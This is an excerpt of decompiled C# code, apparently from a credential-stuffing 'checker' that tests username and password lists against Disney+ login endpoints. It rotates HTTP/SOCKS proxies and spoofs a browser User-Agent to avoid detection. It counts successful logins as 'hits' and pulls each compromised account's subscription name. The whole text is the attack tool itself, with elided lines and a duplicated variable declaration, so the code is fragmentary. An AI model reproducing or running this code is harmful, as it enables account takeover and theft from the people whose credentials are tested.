        ...
        public static bool check(string[] s, string proxy)
        {
            ...
            while (true)
            {
                try
                {
                    ...
                    {
                        int num = 0;
                        proxy = Utils.proxies.ElementAt<string>(new Random().Next(Utils.proxiesCount));
                        if (Utils.proxyProtocol == "HTTP")
                            httpRequest.Proxy = (ProxyClient)HttpProxyClient.Parse(proxy);
                        if (Utils.proxyProtocol == "SOCKS4")
                            httpRequest.Proxy = (ProxyClient)Socks4ProxyClient.Parse(proxy);
                        if (Utils.proxyProtocol == "SOCKS5")
                        ...
                        string str5 = Utils.Parse(httpRequest.Post("https://global.edge.bamgrid.com/devices", str4, "application/json").ToString(), "assertion\":\"", "\"}");
                        ...
                        else
                        {
                            ...
                            while (true)
                            {
                                ...
                                str7 = Utils.Parse(httpResponse1.ToString(), "access_token\":\"", "\"");
                                httpRequest.ClearAllHeaders();
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");
                                ...
                                HttpResponse httpResponse2 = httpRequest.Post("https://disney.edge.bamgrid.com/idp/check", str8, "application/json");
                            ...
                            HttpResponse httpResponse3 = httpRequest.Post("https://disney.edge.bamgrid.com/idp/login", str9, "application/json");
                            if (httpResponse3.ToString().Contains("Bad credentials"))
                                return false;
                            if (httpResponse3.ToString().Contains("id_token"))
                            {
                                httpRequest.ClearAllHeaders();
                                string str8 = "{\"id_token\":\"" + Utils.Parse(httpResponse3.ToString(), "id_token\":\"", "\",") + "\"}";
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");
                                httpRequest.AddHeader("x-bamsdk-platform", str1);
                                ...
                                httpRequest.AddHeader("authorization", "Bearer " + str7);
                                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                                string str10 = Utils.Parse(httpRequest.Post("https://disney.edge.bamgrid.com/accounts/grant", str8, "application/json").ToString(), "assertion\":\"", "\"");
                                httpRequest.ClearAllHeaders();
                                httpRequest.EnableEncodingContent = true;
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                ...
                                string str12 = Utils.Parse(httpRequest.Post("https://global.edge.bamgrid.com/token", str11, "application/x-www-form-urlencoded").ToString(), "access_token\":\"", "\"");
                                httpRequest.ClearAllHeaders();
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");
                                ...
                                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                                httpRequest.EnableEncodingContent = false;
                                HttpResponse httpResponse2 = httpRequest.Get("https://disney.edge.bamgrid.com/subscriptions");
                                ...
                                ++Utils.hits;
                                string str13 = Utils.Parse(httpResponse2.ToString(), "\",\"name\":\"", "\",\"");
                                if (Utils.p1 == "2")
